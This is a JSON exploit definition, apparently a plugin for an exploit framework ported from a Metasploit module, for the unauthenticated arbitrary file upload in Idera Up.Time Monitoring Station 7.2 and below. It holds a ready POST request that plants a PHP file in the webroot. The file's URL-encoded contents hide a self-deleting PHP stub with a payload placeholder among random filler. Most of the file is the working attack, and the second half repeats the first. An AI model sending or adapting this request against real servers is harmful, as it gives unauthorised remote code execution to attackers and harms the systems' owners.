{
   "variables" : {
      "PATH" : {
         "VALUE" : "/",
         "DESCRIPTION" : "The full URI path to the Up.Time instance"
      }
   },
   "title" : "Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload",
   "payload" : "?",
   "platform" : "MULTI",
   "method" : "",
   "description" : "\n\n          This module exploits an arbitrary file upload vulnerability found within the Up.Time\n\n          monitoring server 7.2 and below. A malicious entity can upload a PHP file into the\n\n          webroot without authentication, leading to arbitrary code execution.\n\n\n\n          Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly\n\n          mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use\n\n          exploits/multi/http/uptime_file_upload_2.\n\n      ",
   "requests" : {
      "EXPLOIT2" : {
         "PAYLOAD" : "filename=4zBgVSV/DnGZRPy9v/RYqPg/0NRXwFY/dDriB/9UXq7ri/2hZVQZwur/sMsage/G6doQ.php&file_contents=A%7cP%60yGIH%257%28%3c%3eQ%5dr%7dC%2b%3aZM%28%3a%7de%26ytPjC1%60L%5eKrt6%28%3bSvj%7dKod_Z%7cVV%3cfz3Af3l\\luG%2c%21EU%3f%3aIZ%22%28Lv~%60z1D%7d_%3fS2%2b%3e0DtIikc\\%5eb%3b%3bHU%28-vzb%25e%28%3c%25j0%7b%27vL%27G%60GQL%3aW1g%3aBY/Z~%21%27%3c%3fphp%20unlink%28__FILE__%29%3b__PAYLOAD__%20%3f%3e%7dO\\PX%5d%3bDy6q%3cBbNmR%3ep3H%27%7b.n%29%29f%7b%2a%5dpPd/oIE47Rqu%3a53GY%5e%5eWz%7dvXH%27_%270m1%21%26%29\\kP-v~qYF%40%27%27%3f92Ejr%3fT4%28~%3e8iy%2aXR%3cH%5d%21%5bSG%26%22",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /admin/file_manager.php/login.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "admin/file_manager.php/login.php",
         "METHOD" : "POST"
      }
   },
   "osvdb" : 100423,
   "paths" : [
      "wizards/post2file.php",
      "wizards,@payload_name",
      ""
   ],
   "name" : "UptimeFileUpload_1",
   "msf_module" : "uptime_file_upload_1",
   "references" : [
      "http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf"
   ],
   "path" : "",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "informations" : {
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "REFERENCES" : [
         "http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf"
      ],
      "PATHS" : [
         "wizards/post2file.php",
         "wizards,@payload_name",
         ""
      ],
      "PATH" : "",
      "METHOD" : "",
      "OSVDB" : 100423,
      "name" : "UptimeFileUpload_1",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PAYLOAD" : "filename=4zBgVSV/DnGZRPy9v/RYqPg/0NRXwFY/dDriB/9UXq7ri/2hZVQZwur/sMsage/G6doQ.php&file_contents=A%7cP%60yGIH%257%28%3c%3eQ%5dr%7dC%2b%3aZM%28%3a%7de%26ytPjC1%60L%5eKrt6%28%3bSvj%7dKod_Z%7cVV%3cfz3Af3l\\luG%2c%21EU%3f%3aIZ%22%28Lv~%60z1D%7d_%3fS2%2b%3e0DtIikc\\%5eb%3b%3bHU%28-vzb%25e%28%3c%25j0%7b%27vL%27G%60GQL%3aW1g%3aBY/Z~%21%27%3c%3fphp%20unlink%28__FILE__%29%3b__PAYLOAD__%20%3f%3e%7dO\\PX%5d%3bDy6q%3cBbNmR%3ep3H%27%7b.n%29%29f%7b%2a%5dpPd/oIE47Rqu%3a53GY%5e%5eWz%7dvXH%27_%270m1%21%26%29\\kP-v~qYF%40%27%27%3f92Ejr%3fT4%28~%3e8iy%2aXR%3cH%5d%21%5bSG%26%22",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /admin/file_manager.php/login.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "admin/file_manager.php/login.php",
            "METHOD" : "POST"
         }
      },
      "PAYLOAD" : "?",
      "DESCRIPTION" : "\n\n          This module exploits an arbitrary file upload vulnerability found within the Up.Time\n\n          monitoring server 7.2 and below. A malicious entity can upload a PHP file into the\n\n          webroot without authentication, leading to arbitrary code execution.\n\n\n\n          Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly\n\n          mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use\n\n          exploits/multi/http/uptime_file_upload_2.\n\n      ",
      "TITLE" : "Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload",
      "MSF_MODULE" : "uptime_file_upload_1",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/",
            "DESCRIPTION" : "The full URI path to the Up.Time instance"
         }
      }
   },
   "detection" : {}
}
